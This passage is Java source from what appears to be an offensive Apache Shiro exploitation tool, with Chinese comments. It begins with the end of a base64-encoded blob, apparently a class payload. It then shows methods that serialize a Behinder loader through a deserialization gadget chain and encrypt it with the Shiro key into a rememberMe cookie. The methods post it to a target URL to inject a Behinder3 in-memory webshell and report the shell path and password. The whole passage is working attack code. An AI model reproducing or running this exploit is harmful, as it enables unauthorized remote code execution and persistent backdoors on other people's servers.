8SUbYAUjoFGQUEtgBTGQUZBrYAVMAAVjoHElcSWLYAUjoIGQgEtgBTGQgZB7IAWbYAWhkEKyq5AFsDADoJGQmyAFy4AF0DBL0AXlkDLFO5AF8EABJWEmABtgBhOgoZCgS2ACoZChkHAbYANFcZCBkHsgBitgBaGQgZB7IAYrYAWqcAIToKGQgZB7IAYrYAWqcAEjoLGQgZB7IAYrYAWhkLv7EABAAiALsAyAA3ACIAuwDXAAAAyADKANcAAADXANkA1wAAAAIAawAAAHoAHgAAAGAACABhABMAYgAWAGMAGQBkABwAZQAfAGYAIgBoAC4AaQA0AGoAQABrAEwAbABSAG0AXgBuAGcAbwBtAHAAdwBxAIIAcgCYAHMAogB0AKgAdQCxAHYAuwB6AMUAewDIAHcAygB6ANQAewDXAHoA4wB7AOYAfQByAAAARAAD%2FwDIAAoHAIkHAHoHAHoHAHMHAIoHAIsHAIwHAI0HAIsHAI4AAQcAe04HAI%2F%2FAA4ABQcAiQcAegcAegcAcwcAigAAAG4AAAAEAAEAQgACAJAAAAACAJEBAwAAAAoAAQD1AV4BAgYJ");
    }
    // gadget 选择的内存马类型
    public boolean baseInject(String gadget,String memShellType,String password) throws Exception{
        Class gadgetClass = successGadget.get(gadget);

        if (gadgetClass != null){
            String k = paramContext.get("ShiroKey"); // key
            // 根据 memShellType 选择对应的函数
            boolean flag = false;
            if (memShellType.equals("Behinder3")){
                flag = Behinder3Inject(k,gadgetClass,password);
            }else {
                this.myController.result.appendText("[!] 哥斯拉和reg近期添加！！\n");
                return false;
            }
            return flag;
        }else {
            this.myController.result.appendText("[!] 请先检测利用链再进行注入！!\n");
            return false;
        }
    }

    public boolean Behinder3Inject(String k,Class gadgetClass,String password) throws Exception{
        Map<String, List<String>> header = null;
        List<String> Inject = null;
        // behinder 的 loader
        byte[] BehinderLoaderBytes = new BASE64Decoder().decodeBuffer(memShellLoader.get("BehinderLoader"));
        // 要根据对应的利用链加密！！！
        Method getObject = gadgetClass.getDeclaredMethod("getObject",byte[].class);
        getObject.setAccessible(true);
        byte[] bytes = Serializer.serialize(getObject.invoke(gadgetClass.newInstance(), BehinderLoaderBytes)); // 利用反射进行调用

        String encryptType = this.paramContext.get("Encrypt");
        String BehinderLoderCookie = null;
        if (encryptType.equals("CBC")){
            BehinderLoderCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesCbcEncrypt(bytes,k);
        } else{
            BehinderLoderCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesGcmEncrypt(bytes,k);
        }

        String classData1 = "classData1=" + memShellLoader.get("PageContext");
        String classData2 = "classData2=" + memShellLoader.get("MemBehinder3");

        String postData = classData1 + "&" + classData2;
        if (paramContext.get("OutputType").equals("1")){
            this.myController.result.appendText("\nPayload输出模式:");
            this.myController.result.appendText("\nCheck Cookie: " + BehinderLoderCookie + "\n");
            this.myController.result.appendText(postData + "\n");
            this.myController.result.appendText("在下次请求头中的header中带上 pass：" + password + " 如看到返回头中有Inject:Success 则说明注入成功\n");
        }
        String url = CommonUtils.normizeUrl(paramContext.get("URL")) + CommonUtils.normizePath(paramContext.get("Path"));  // 标准化的url
        header = this.httpUtils.sendPostRequest(url,BehinderLoderCookie,postData);
        if (header != null){
            Map<String, List<String>> checkHeader = this.httpUtils.sendCheckInject(url+"?pass=success",null,password);
            Inject = checkHeader.get("Inject");
            if (Inject != null && Inject.toString().contains("Success")){
                this.myController.result.appendText("[+] 冰蝎内存马注入成功！\n");
                this.myController.result.appendText("[+] 内存马路径: " + url + "?pass=success \n" );
                this.myController.result.appendText("[+] 密码: " + password +  "\n" );
                return true;
            }else {
                this.myController.result.appendText("[!] 冰蝎内存马注入失败,请尝试切换到有权限的目录\n\n");
                return false;
            }
        } else {
            this.myController.result.appendText("[!] 未检测到返回头 ！\n\n");
            return false;
        }
    }
}
